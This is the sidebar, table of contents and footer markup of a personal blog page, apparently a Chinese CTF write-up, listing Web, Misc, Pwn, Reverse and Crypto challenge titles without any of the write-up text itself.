          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"><a href="https://www.porlockz.com" target="_blank">Porlock</a></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-php"><span class="nav-number">1.1.</span> <span class="nav-text">easy_php</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#出题人小声比比"><span class="nav-number">1.1.1.</span> <span class="nav-text">出题人小声比比</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#考点"><span class="nav-number">1.1.2.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识"><span class="nav-number">1.1.3.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程"><span class="nav-number">1.1.4.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-Login"><span class="nav-number">1.2.</span> <span class="nav-text">easy_Login</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-injection"><span class="nav-number">1.3.</span> <span class="nav-text">easy-injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#出题人感想"><span class="nav-number">1.3.1.</span> <span class="nav-text">出题人感想</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-2"><span class="nav-number">1.3.4.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极光实验室招新报名表"><span class="nav-number">1.4.</span> <span class="nav-text">极光实验室招新报名表</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-3"><span class="nav-number">1.4.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload-something"><span class="nav-number">1.5.</span> <span class="nav-text">upload something</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-4"><span class="nav-number">1.5.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#badip"><span class="nav-number">1.6.</span> <span class="nav-text">badip</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-5"><span class="nav-number">1.6.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-5"><span class="nav-number">1.6.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#different"><span class="nav-number">1.7.</span> <span class="nav-text">different</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-6"><span class="nav-number">1.7.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-6"><span class="nav-number">1.7.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-6"><span class="nav-number">1.7.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#regular-expression0"><span class="nav-number">2.1.</span> <span class="nav-text">regular_expression0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#regular-expression1"><span class="nav-number">2.2.</span> <span class="nav-text">regular_expression1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#half"><span class="nav-number">2.3.</span> <span class="nav-text">half</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">2.4.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solidity"><span class="nav-number">2.5.</span> <span class="nav-text">solidity</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#overflow"><span class="nav-number">2.6.</span> <span class="nav-text">overflow</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一个复读机"><span class="nav-number">3.1.</span> <span class="nav-text">一个复读机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#又一个复读机"><span class="nav-number">3.2.</span> <span class="nav-text">又一个复读机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babystack"><span class="nav-number">3.3.</span> <span class="nav-text">babystack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyheap"><span class="nav-number">3.4.</span> <span class="nav-text">babyheap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-7"><span class="nav-number">3.4.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-7"><span class="nav-number">3.4.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#message"><span class="nav-number">3.5.</span> <span class="nav-text">message</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-8"><span class="nav-number">3.5.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-8"><span class="nav-number">3.5.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#学术前沿：幽灵"><span class="nav-number">3.6.</span> <span class="nav-text">学术前沿：幽灵</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-9"><span class="nav-number">3.6.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#出题动机"><span class="nav-number">3.6.2.</span> <span class="nav-text">出题动机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-7"><span class="nav-number">3.6.3.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-9"><span class="nav-number">3.6.4.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTFnote"><span class="nav-number">3.7.</span> <span class="nav-text">ACTFnote</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">4.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#anti全家桶"><span class="nav-number">4.1.</span> <span class="nav-text">anti全家桶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-10"><span class="nav-number">4.1.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-8"><span class="nav-number">4.1.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-10"><span class="nav-number">4.1.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二进制"><span class="nav-number">4.2.</span> <span class="nav-text">二进制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点-11"><span class="nav-number">4.2.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识-9"><span class="nav-number">4.2.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程-11"><span class="nav-number">4.2.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#whitegive"><span class="nav-number">4.3.</span> <span class="nav-text">whitegive</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#要啥三轮车"><span class="nav-number">4.4.</span> <span class="nav-text">要啥三轮车</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vm"><span class="nav-number">4.5.</span> <span class="nav-text">vm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleCheck"><span class="nav-number">4.6.</span> <span class="nav-text">SimpleCheck</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sse"><span class="nav-number">4.7.</span> <span class="nav-text">sse</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#naive-PRNG0"><span class="nav-number">5.1.</span> <span class="nav-text">naive_PRNG0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#naive-PRNG1"><span class="nav-number">5.2.</span> <span class="nav-text">naive_PRNG1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Environment"><span class="nav-number">5.3.</span> <span class="nav-text">Environment</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#naive-RSA0"><span class="nav-number">5.4.</span> <span class="nav-text">naive_RSA0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#naive-SPN"><span class="nav-number">5.5.</span> <span class="nav-text">naive_SPN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle-Lab0"><span class="nav-number">5.6.</span> <span class="nav-text">Oracle_Lab0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle-Lab2"><span class="nav-number">5.7.</span> <span class="nav-text">Oracle_Lab2</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"><a href="https://www.porlockz.com" target="_blank">Porlock</a></span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

<!-- 页面点击小红心 -->
<!-- <script type="text/javascript" src="/js/src/love.js"></script> -->

</body>
</html>
